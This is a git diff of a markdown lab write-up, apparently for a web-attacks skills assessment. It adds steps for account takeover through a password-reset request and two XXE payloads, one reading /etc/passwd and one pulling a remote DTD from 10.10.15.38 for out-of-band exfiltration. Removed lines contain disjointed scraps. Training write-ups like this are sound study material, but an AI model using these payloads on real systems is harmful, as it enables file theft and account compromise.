@@ -146,7 +146,7 @@ Cookie: role=employee
 ]>
 ```  
 
->Add the following entity in the email field that is reflected and print the base64 encode source code of the `connection.php` file.  
+>Add the following entity, `&fuzzer;` into the email field that is reflected and print the base64 encode source code of the `connection.php` file.  
 
 ![xxe-reading-source-code](/images/xxe-reading-source-code.png)  
 
@@ -249,18 +249,55 @@ Connection: close
 {"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
 ```  
 
->Source code from `http://94.237.49.11:42268/settings.php` 
+>Source code from `http://94.237.49.11:42268/settings.php` show password reset check for POST HTTP Verb.  
 
 ![web-attack-skills-assessment-source-code](/images/web-attack-skills-assessment-source-code.png)   
 
+## Privilege Escalation  
 
-Generate cookie pair value for the PHPSESSID using md5 value, `echo -n 52 | md5sum
-7upnen37ktj7tgo7jds7v0fhhj
-7upnen37ktj7tgo7jds7v0fhhj
-9a1158154dfa42caddbd0694a4e9bdc8
+Change to GET request and move web parameters.
 
-
+![web-attack-skills-assessment-password-changed](/images/web-attack-skills-assessment-password-changed.png)  
 
 
+```
+GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=password HTTP/1.1
+```
 
+>Credentials for administrator: `a.corrales`:`password`.  
+
+## Data Exfiltration  
+
+>Enumeration as administrator indicated new function at `http://94.237.49.11:42268/event.php`.
+
+![web-attack-skills-assessment-admin-events](/images/web-attack-skills-assessment-admin-events.png)  
+
+>read the flag at '/flag.php'.
+
+
+```xml
+<!DOCTYPE name [<!ENTITY fuzz SYSTEM "file:///etc/passwd">]>
+            <root>
+            <name>&fuzz;</name>
+            <details>fuzzing</details>
+            <date>2023-07-26</date>
+            </root>
+```
+
+
+
+
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://10.10.15.38:80/blind.dtd">
+  %remote;
+  %oob;
+]>
+<root>
+&content;
+</root>
+
+```
 
